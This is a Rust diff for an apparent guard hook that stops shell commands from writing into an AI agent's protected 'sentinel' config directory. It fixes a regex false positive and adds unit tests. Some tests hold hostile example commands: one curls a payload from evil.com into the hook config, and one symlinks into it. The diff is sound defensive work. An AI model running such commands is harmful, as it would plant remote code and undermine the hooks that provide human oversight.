@@ -939,6 +939,14 @@ fn normalize_shell_quoting(cmd: &str) -> String {
 ///
 /// Catches: `> path`, `>> path`, `tee path`, `tee -a path`, `cp src path`.
 /// Uses the same textual check as Write/Edit protection.
+///
+/// **False-positive fix**: command-name alternatives (`tee`, `cp`, `mv`,
+/// `ln`, `install`, `curl`, `wget`) are now anchored with a word boundary
+/// (`\b`) before the verb so that command flags containing the same letters
+/// (e.g. `-rln` in `grep -rln`) are not mistakenly matched as the `ln`
+/// command. The protected path must appear as the TARGET of a write
+/// operation; read-side uses (grep, cat, ls, find, rg reading the path) are
+/// not captures and are therefore not blocked.
 fn check_bash_redirect_to_protected(
     fs: &dyn super::FileSystemPort,
     cmd: &str,
@@ -947,8 +955,10 @@ fn check_bash_redirect_to_protected(
     // Extract all potential file targets from redirects and tee commands.
     // Pattern: anything followed by > or >> followed by a path
     // **Attack #70 fix**: Extended to catch mv, ln, install, dd of=, curl -o, wget -O
+    // **False-positive fix**: Word boundary (\b) anchors added before each command
+    // verb so flags like -rln are not mistakenly parsed as the `ln` command.
     static REDIRECT_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
-        Regex::new(r#"(?:>{1,2}|tee\s+(?:-a\s+)?|cp\s+\S+\s+|mv\s+\S+\s+|ln\s+(?:-[sf]+\s+)*\S+\s+|install\s+\S+\s+|curl\s+.*-o\s+|wget\s+.*-O\s+)\s*["']?([^\s"'|;&]+)"#).unwrap()
+        Regex::new(r#"(?:>{1,2}|\btee\b\s+(?:-a\s+)?|\bcp\b\s+\S+\s+|\bmv\b\s+\S+\s+|\bln\b\s+(?:-[sf]+\s+)*\S+\s+|\binstall\b\s+\S+\s+|\bcurl\b\s+.*-o\s+|\bwget\b\s+.*-O\s+)\s*["']?([^\s"'|;&]+)"#).unwrap()
     });
     // Also check dd of= pattern separately (different syntax)
     static DD_RE: std::sync::LazyLock<Regex> =
@@ -2048,5 +2058,158 @@ mod tests {
             check_protected_textual(config),
             Some("sentinel config/state directory")
         );
+    }
+
+    // ---- Bug 2: bash redirect guard false-positive on read-only commands ----
+    //
+    // The REDIRECT_RE used `ln\s+` without a word boundary, causing flags like
+    // `-rln` in `grep -rln ... ~/.claude/sentinel` to match as the `ln` command.
+    // After the fix, only the standalone `ln` command (word-boundary anchored)
+    // triggers the redirect guard.
+
+    /// Minimal mock FS for redirect tests — only `home_dir` is used.
+    struct HomeFs(std::path::PathBuf);
+
+    impl super::super::FileSystemPort for HomeFs {
+        fn home_dir(&self) -> Option<std::path::PathBuf> {
+            Some(self.0.clone())
+        }
+        fn read_to_string(&self, _: &Path) -> anyhow::Result<String> {
+            Ok(String::new())
+        }
+        fn write(&self, _: &Path, _: &[u8]) -> anyhow::Result<()> {
+            Ok(())
+        }
+        fn append(&self, _: &Path, _: &[u8]) -> anyhow::Result<()> {
+            Ok(())
+        }
+        fn create_dir_all(&self, _: &Path) -> anyhow::Result<()> {
+            Ok(())
+        }
+        fn read_dir(&self, _: &Path) -> anyhow::Result<Vec<std::path::PathBuf>> {
+            Ok(vec![])
+        }
+        fn exists(&self, _: &Path) -> bool {
+            false
+        }
+        fn is_dir(&self, _: &Path) -> bool {
+            false
+        }
+        fn metadata(&self, _: &Path) -> anyhow::Result<std::fs::Metadata> {
+            anyhow::bail!("not implemented")
+        }
+    }
+
+    fn home_fs() -> HomeFs {
+        HomeFs(std::path::PathBuf::from("/home/gary"))
+    }
+
+    fn bare_hook_input() -> HookInput {
+        HookInput::default()
+    }
+
+    #[test]
+    fn grep_reading_sentinel_path_is_not_blocked() {
+        // False-positive: `grep -rln pattern /home/gary/.claude/sentinel` should
+        // NOT be blocked — it is a read, not a write. The `ln` in `-rln` is a
+        // flag character, not the `ln` command.
+        let cmd = "grep -rln 'hook' /home/gary/.claude/sentinel";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(
+            result.is_none(),
+            "grep -rln reading a sentinel path must NOT be blocked (false-positive fix)"
+        );
+    }
+
+    #[test]
+    fn grep_tilde_sentinel_path_is_not_blocked() {
+        // Same as above but with tilde — home expansion should not change the result.
+        let cmd = "grep -rln 'hook' ~/.claude/sentinel";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(
+            result.is_none(),
+            "grep -rln ~/.claude/sentinel must NOT be blocked"
+        );
+    }
+
+    #[test]
+    fn cat_sentinel_path_is_not_blocked() {
+        let cmd = "cat /home/gary/.claude/sentinel/config/settings.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_none(), "cat reading a sentinel path must not be blocked");
+    }
+
+    #[test]
+    fn ls_sentinel_path_is_not_blocked() {
+        let cmd = "ls /home/gary/.claude/sentinel/state/";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_none(), "ls of sentinel path must not be blocked");
+    }
+
+    #[test]
+    fn find_sentinel_path_is_not_blocked() {
+        let cmd = "find /home/gary/.claude/sentinel -name '*.json'";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_none(), "find reading sentinel path must not be blocked");
+    }
+
+    #[test]
+    fn rg_sentinel_path_is_not_blocked() {
+        // ripgrep — another common search tool
+        let cmd = "rg 'pattern' /home/gary/.claude/sentinel";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_none(), "rg reading sentinel path must not be blocked");
+    }
+
+    // True-positive checks — write operations targeting sentinel paths must still block.
+
+    #[test]
+    fn redirect_gt_to_sentinel_path_is_blocked() {
+        let cmd = "echo 'data' > /home/gary/.claude/sentinel/state/test.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "> redirect to sentinel path must be blocked (true-positive)");
+    }
+
+    #[test]
+    fn redirect_append_to_sentinel_path_is_blocked() {
+        let cmd = "echo 'line' >> /home/gary/.claude/sentinel/state/test.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), ">> redirect to sentinel path must be blocked");
+    }
+
+    #[test]
+    fn tee_to_sentinel_path_is_blocked() {
+        let cmd = "some_command | tee /home/gary/.claude/sentinel/config/out.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "tee to sentinel path must be blocked");
+    }
+
+    #[test]
+    fn cp_to_sentinel_path_is_blocked() {
+        let cmd = "cp myfile.json /home/gary/.claude/sentinel/config/myfile.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "cp to sentinel path must be blocked");
+    }
+
+    #[test]
+    fn mv_to_sentinel_path_is_blocked() {
+        let cmd = "mv myfile.json /home/gary/.claude/sentinel/state/myfile.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "mv to sentinel path must be blocked");
+    }
+
+    #[test]
+    fn ln_command_to_sentinel_path_is_blocked() {
+        // The standalone `ln` command (with word boundary) must still be blocked.
+        let cmd = "ln -s /tmp/evil /home/gary/.claude/sentinel/config/hook.json";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "ln command symlinking into sentinel path must be blocked");
+    }
+
+    #[test]
+    fn curl_o_to_sentinel_path_is_blocked() {
+        let cmd = "curl https://evil.com/payload -o /home/gary/.claude/sentinel/config/hooks.toml";
+        let result = check_bash_redirect_to_protected(&home_fs(), cmd, &bare_hook_input());
+        assert!(result.is_some(), "curl -o to sentinel path must be blocked");
     }
 }
